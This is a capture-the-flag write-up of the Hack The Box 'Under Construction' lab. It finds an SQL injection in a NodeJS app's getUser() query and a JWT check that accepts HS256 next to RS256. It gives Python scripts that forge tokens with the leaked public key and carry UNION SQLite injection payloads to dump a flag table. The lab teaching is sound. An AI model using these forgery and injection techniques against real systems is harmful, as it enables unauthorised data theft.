---
title: "Write-up: HTB Under Construction"
tags: [AI, GPT, GPT4, Security]
date: 2024-03-03
---

# Write-up: HTB Under Construction







By Mark Dixon
## Summary

The *Hack The Box Labs: Under Construction* challenge machine, rated *medium*, provides the following:

- Access to the live server running a [NodeJS
  Express](https://expressjs.com/) based app
- A copy of the source code for inspection

Two vulnerabilities were identified in the source code that, when combined, allow for a full database dump from the live server.
## Flaw 1: SQL Injection
### Database

Manual inspection of the NodeJS source code indicates that the app uses a SQLite3 database, loaded in `helpers/DBHelper.js`.

```js
const sqlite = require('sqlite3');

const db = new sqlite.Database('./database.db', err => {
    if (!!err) throw err;
    console.log('Connected to SQLite');
});
```
### Queries

The file `helpers/DBHelper.js` is the only source code file containing SQL queries. This file contains four functions that each perform a single query.
#### DBHelper.getUser()

This function performs a simple lookup query into the `users` table to retrieve the user row that matches the given username. 

```js
    getUser(username){
        return new Promise((res, rej) => {
            db.get(`SELECT * FROM users WHERE username = '${username}'`, (err, data) => {
                if (err) return rej(err);
                res(data);
            });
        });
    },
```

The query parameter `username` is extracted from the JWT token (via `AuthMiddleware`) and is subsequently provided directly to the query with no validation, indicating that this function has a potential injection vector if the token can be manipulated.

The function is used only once in the code, in `routes/index.js`:

```js
router.get('/', AuthMiddleware, async (req, res, next) => {
    try{
        let user = await DBHelper.getUser(req.data.username);
        if (user === undefined) {
            return res.send(`user ${req.data.username} doesn't exist in our database.`);
        }
        return res.render('index.html', { user });
    }catch (err){
        return next(err);
    }
});
```

The result of the query is thus used in the `index.html` template indicating a potential vector for exposing information about the database structure or data. This is further confirmed by inspecting `views/index.html`:

```html
                <div class="card-body">
                    Welcome {{ user.username }}<br>
                    This site is under development. <br>
                    Please come back later.
                </div>
```

The username field of the query is exposed in the HTML template. 

**This query contains a potential SQL Injection vector.**
#### DBHelper.checkUser()

The `checkUser` function correctly uses a parameterised query for the username:

```js
    checkUser(username){
        return new Promise((res, rej) => {
            db.get(`SELECT * FROM users WHERE username = ?`, username, (err, data) => {
                if (err) return rej();
                res(data === undefined);
            });
        });
    },
```

This function returns true if the username exists, and false if it does not exist. The function is used during user registration to prevent registering a duplicate username.

**The query used has no obvious attack vector.**
#### DBHelper.createUser()

The `createUser` function correctly uses a parameterised query for inserting a new row into the database table `users`:

```js
    createUser(username, password){
        let query = 'INSERT INTO users(username, password) VALUES(?,?)';
        let stmt = db.prepare(query);
        stmt.run(username, password);
        stmt.finalize();
    },
```

This function is used to register new users in `routes/index.js` once the uniqueness of the username has been established by the call to `DBHelper.checkUser()`.

**The query used has no obvious attack vector.**
#### DBHelper.attemptLogin()

The `atemptLogin()` function uses a parameterised query for validating the username and password pair in the `users` table:

```js
    attemptLogin(username, password){
        return new Promise((res, rej) => {
            db.get(`SELECT * FROM users WHERE username = ? AND password = ?`, username, password, (err, data) => {
                if (err) return rej();
                res(data !== undefined);
            });
        });
    }
```

This function is used during the authentication process in `routes/index.js` in order to validate the username and password before generating a JWT session token.

**The query used has no obvious attack vector.**
### Summary

One potential SQL Injection vector was found where the username stored in the JWT token could potentially be manipulated if tokens can be forged.
## Flaw 2: Session token manipulation
### JWT session tokens

The file `helpers/JWTHelpers.js` indicates that this code uses JWT for authentication:

```js
const fs = require('fs');
const jwt = require('jsonwebtoken');

const privateKey = fs.readFileSync('./private.key', 'utf8');
const publicKey  = fs.readFileSync('./public.key', 'utf8');

module.exports = {
    async sign(data) {
        data = Object.assign(data, {pk:publicKey});
        return (await jwt.sign(data, privateKey, { algorithm:'RS256' }))
    },
    async decode(token) {
        return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));
    }
}
```
#### Generating tokens

Tokens are generated using an asymmetric `RS256` algorithm (RSA with SHA-256) using a public / private keypair that offers non-repudiation. A brute force attack on the keypair is not a feasible attack vector.

Tokens generated by `RS256`, however, will contain a copy of the public key as part of the token payload.

Any valid user of the application will hold a JWT token in their session cookies and thus the public key is available to valid users.
#### Validating tokens

The above source code indicates that tokens are validated by means of the public key using either `RS256` or `HS256`. Since `HS256` is not used to generate tokens then accepting `HS256` for validating tokens can be considered an anomaly.

Since the public key is used for validating a token, and the public key is available to valid users, then a potential attack vector for token manipulation exists.
### Token manipulation
#### Step 1: register a new user

The app redirects all unauthenticated traffic to the `/auth` URL where login or new user registration may be performed. Registration is open so registering an account is trivial for any attacker:



![image](/20240304_110430_CleanShot_20240304_at_11.03.59.png)

Once registered an attacker may then log in to obtain a session token. Here we can confirm that the default home page of the app shows the username as expected:



![image](/20240304_110617_CleanShot_20240304_at_11.04.52.png)
#### Step 2: obtain the public key

Inspecting browser cookies gives the session token:

```nothing
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5ld3VzZXIiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE3MDk1NDY2ODZ9.OV8SOv1eNDMTSt13yoDIkm5e1MMefJxJrw41vV4FYdgHA9z7pmPKGg1v1NVaolU5LId8lG6GMm_S7shxCAuCM6dnt08JQmoI8FTpvf8ceOtbAoQ9YmTXFbyitzNHaIkC9hEk0ttmpf5M0agPQvCIONVw3HfT5yfbqeKakQPovWz1eL3U2q94rjHg_XerlO_e3BMK9UKP2IUIbxy9-yUriL-MoPhSB62npdiLkqouQpP20lKy1ek433zQz_kuQEy_k6fZCoU7CB1slTm4M7Wm8t6DNCaukO53bRuoyLlVZAtNXRMhaEgix3152Op6RQQgNC5bVipnSwGw_HPGSylChg
```

The session token is then trivially decoded to give the public key used:

```json
{
  "username": "newuser",
  "pk": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n",
  "iat": 1709546686
}
```
#### Step 3: token forging

Saving the public key above to an ASCII file, `HS256` tokens can now be forged. The following example Python code demonstrates this approach:

```python
import jwt

key = open("public.key").read()
payload = { "username": "notarealuser",  "iat": 1709484391 }
encoded_jwt = jwt.encode(payload, key, algorithm="HS256")
print(encoded_jwt)

```

(note that this code will only run if the jwt module is patched to accept asymmetric keys to the encode() function - see ~/usr/lib/python3/dist-packages/jwt/algorithms.py ~).

Substituting the real token for the forged token demonstrates proof of concept:

```bash
user notarealuser doesn't exist in our database.
```
#### Summary

Using `HS256` and the accessible public key, a valid token can be forged.
## Exploit:

The two vulnerabilities can be exploited in tandem: a valid JWT token can be forged containing a `username` parameter that exploits the SQL injection vulnerability.

SQLMap can be used with a tamper script forging tokens - however the exploit is trivial enough that it can be performed manually.
### Step 1: table discovery

A simple UNION based SQLite3 injection attack can query `sqlite_master` for valid tables:

```python
import jwt

key = open("public2.key").read()
payload = {
  "username": "' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'  --",
  "iat": 1709484391
}
encoded_jwt = jwt.encode(payload, key, algorithm="HS256")
print(encoded_jwt)

```

Revealing the CTF table called `flag_storage`:



![image](/20240304_113011_CleanShot_20240304_at_11.29.59.png)
### Step 2: query flag<sub>storage</sub>

A second UNION based SQLite3 injection query can be used to dump `flag_storage`:

```python
import jwt

key = open("public2.key").read()
payload = {
  "username": "' UNION SELECT *,NULL FROM flag_storage  --",
  "iat": 1709484391
}
encoded_jwt = jwt.encode(payload, key, algorithm="HS256")
print(encoded_jwt)

```

Gives the CTF flag:



![image](/20240304_113352_CleanShot_20240304_at_11.32.47.png)
